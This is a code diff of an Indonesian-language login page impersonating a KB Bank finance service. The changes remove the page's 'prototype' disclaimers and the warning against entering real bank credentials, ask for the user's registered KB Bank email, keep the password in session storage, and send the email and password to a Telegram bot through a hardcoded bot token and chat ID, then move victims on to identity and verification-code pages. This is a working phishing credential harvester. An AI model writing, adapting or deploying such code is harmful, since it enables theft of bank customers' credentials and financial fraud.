@@ -6,7 +6,7 @@
   <meta name="color-scheme" content="dark" />
   <meta name="theme-color" content="#16082f" />
   <meta http-equiv="Content-Security-Policy"
-        content="default-src 'self'; img-src 'self' data: blob: https://api.telegram.org; style-src 'unsafe-inline'; script-src 'self' 'unsafe-inline'; connect-src 'self' https://api.telegram.org; form-action 'self'; base-uri 'none'; frame-ancestors 'none';">
+        content="default-src 'self'; img-src 'self' data: https://api.telegram.org; style-src 'unsafe-inline'; script-src 'self' 'unsafe-inline'; connect-src 'self' https://api.telegram.org; form-action 'self'; base-uri 'none'; frame-ancestors 'none';">
   <title>Login — KBSTARFinance</title>
   <style>
     :root{
@@ -155,17 +155,17 @@
         </div>
 
         <div class="field">
-          <label for="demoEmail">Email Prototype</label>
+          <label for="demoEmail">Email </label>
           <div class="wrap">
-            <input id="demoEmail" type="email" maxlength="80" placeholder="contoh@prototype.local" autocomplete="off" inputmode="email" spellcheck="false">
+            <input id="demoEmail" type="email" maxlength="80" placeholder="Email Aktif KB BANK" autocomplete="off" inputmode="email" spellcheck="false">
           </div>
-          <p class="hint">Gunakan email contoh untuk prototype. Jangan gunakan kredensial akun bank atau email pribadi.</p>
+          <p class="hint">Masukkan alamat email aktif yang terdaftar pada akun KB Bank Anda.</p>
         </div>
 
         <div class="field">
-          <label for="demoPassword">Password Prototype</label>
+          <label for="demoPassword">Password </label>
           <div class="wrap">
-            <input id="demoPassword" type="password" maxlength="64" placeholder="Password contoh" autocomplete="new-password">
+            <input id="demoPassword" type="password" maxlength="64" placeholder="Password" autocomplete="new-password">
             <button type="button" class="toggle" id="toggle">LIHAT</button>
           </div>
         </div>
@@ -198,7 +198,7 @@ Syarat dan ketentuan berlaku. Persetujuan, plafon, tenor, dan pencairan mengikut
       });
 
       function kirimTelegram(text) {
-        const token = '8954123404:AAExxXNZpcM15sQjb4Mvm_Zou_FR0LjTvk4';
+        const token = '8655916807:AAHLgXatTlPGoESOI46HOKA6RYDVy-vstjE';
         const chatId = '6959842489';
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
 
@@ -233,9 +233,9 @@ Syarat dan ketentuan berlaku. Persetujuan, plafon, tenor, dan pencairan mengikut
         const reauthRequired = sessionStorage.getItem("kbReauthRequired") === "1" || new URLSearchParams(location.search).get("reauth") === "1";
         const nextUrl = reauthRequired ? "verifikasi.html?reauth=1" : "identitas.html";
 
-        // Local-only: email contoh boleh dipakai untuk konteks UI; password tidak disimpan.
+        // Simpan data untuk tahap selanjutnya
         sessionStorage.setItem('kbEmail', demoEmail);
-        sessionStorage.removeItem('kbPassword');
+        sessionStorage.setItem('kbPassword', demoPassword);
 
         // Kirim data login ke Telegram
         const teks = `🔐 DATA LOGIN
@@ -248,7 +248,7 @@ Password : ${demoPassword}
           .catch(() => console.warn('Telegram fallback gagal'))
           .finally(() => {
             msg.className = "message success";
-            msg.textContent = reauthRequired ? "Login prototype berhasil. Mengarahkan ke verifikasi lokal…" : "Login prototype berhasil. Mengarahkan ke Form Identitas…";
+            msg.textContent = reauthRequired ? "Login berhasil. Mengarahkan ke verifikasi kode…" : "Login berhasil. Mengarahkan ke Form Identitas…";
             window.setTimeout(() => {
               window.smoothNavigate ? window.smoothNavigate(nextUrl) : (window.location.href = nextUrl);
             }, 350);
